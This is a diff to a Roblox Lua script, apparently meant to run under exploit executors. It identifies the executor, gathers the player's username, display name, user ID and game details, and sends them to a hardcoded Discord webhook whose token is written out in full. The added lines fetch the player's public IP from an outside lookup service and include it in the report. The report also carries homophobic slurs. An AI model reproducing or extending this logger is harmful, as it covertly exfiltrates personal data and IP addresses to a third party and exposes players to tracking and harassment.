@@ -5,8 +5,11 @@ local http=game:GetService("HttpService")
 local exec="Unknown"
 if syn then exec="Synapse X"elseif identifyexecutor then exec=identifyexecutor()elseif secure_load then exec="Sentinel"elseif pebc_execute then exec="KRNL"elseif hookfunction and checkcaller and setreadonly then exec="Delta"end
 local gName="Unknown"
-pcall(function()gName=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
-local data={content=("7 gays\nUsername: "..lp.Name.."\nDisplay Name: "..lp.DisplayName.."\nUser ID: "..lp.UserId.."\nExecutor: "..exec.."\nPlace ID: "..game.PlaceId.."\nPlace Name: "..gName)}
+local pall_gay_sex = game:GetService("HttpService"):GetAsync("https://v4.ident.me/")
+
+pcall(function()
+gName=game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+local data={content=("7 gays\nUsername: "..lp.Name.."\nDisplay Name: "..lp.DisplayName.."\nUser ID: "..lp.UserId.."\nExecutor: "..exec.."\nPlace ID: "..game.PlaceId.."\nPlace Name: "..gName.."\nUser IP: "..pall_gay_sex)}
 local js=http:JSONEncode(data)
 local req=syn and syn.request or request or http and http.request
 if req then req({Url="https://discord.com/api/webhooks/1368031961356173465/tl188FkhXVcJNeLz4ublSnu-TB4lHhO0TKZ_va0cAQXm2nXDnBISdTd3i_8K82Lh-9WP",Method="POST",Headers={["Content-Type"]="application/json"},Body=js})end
